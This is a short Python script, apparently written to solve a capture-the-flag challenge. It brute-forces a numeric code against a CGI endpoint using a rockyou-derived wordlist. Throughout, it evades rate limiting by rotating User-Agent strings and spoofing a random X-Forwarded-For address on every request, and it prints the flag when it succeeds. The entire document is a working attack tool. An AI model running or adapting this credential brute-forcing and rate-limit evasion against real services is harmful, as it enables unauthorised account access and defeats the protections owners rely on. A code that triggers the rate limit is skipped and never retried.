#!/usr/bin/env python3

import requests
import time
import random

# === Config ===
TARGET_URL = 'http://10.66.182.15:8080/cgi-bin/psych_check.sh'  # Replace with real URL
WORDLIST_FILE = 'psych_rockyou_digits.txt'
SLEEP_TIME = 1.0  # Adjust if server is aggressive with rate limiting

# === Optional: Use real or generated User-Agent strings ===
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "curl/7.68.0",
    "CTFScanner/1.0"
]

def generate_ip():
    return f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"

def brute_force():
    with open(WORDLIST_FILE, 'r') as f:
        codes = [line.strip() for line in f if line.strip()]

    for code in codes:
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': random.choice(USER_AGENTS),
            'X-Forwarded-For': generate_ip()
        }

        data = f'code={code}'
        try:
            response = requests.post(TARGET_URL, headers=headers, data=data, timeout=5)
            json_data = response.json()

            if 'error' in json_data and json_data['error'] == 'rate_limit':
                print(f"[!] Rate limited. Sleeping longer...")
                time.sleep(2.5)
                continue

            if json_data.get('ok'):
                print(f"[✅] SUCCESS! Code: {code}")
                print(f"[🚩] Flag: {json_data.get('flag', 'No flag in response')}")
                break
            else:
                print(f"[x] Tried code: {code} - Invalid")

        except Exception as e:
            print(f"[!] Error with code {code}: {e}")
        time.sleep(SLEEP_TIME)

if __name__ == '__main__':
    brute_force()
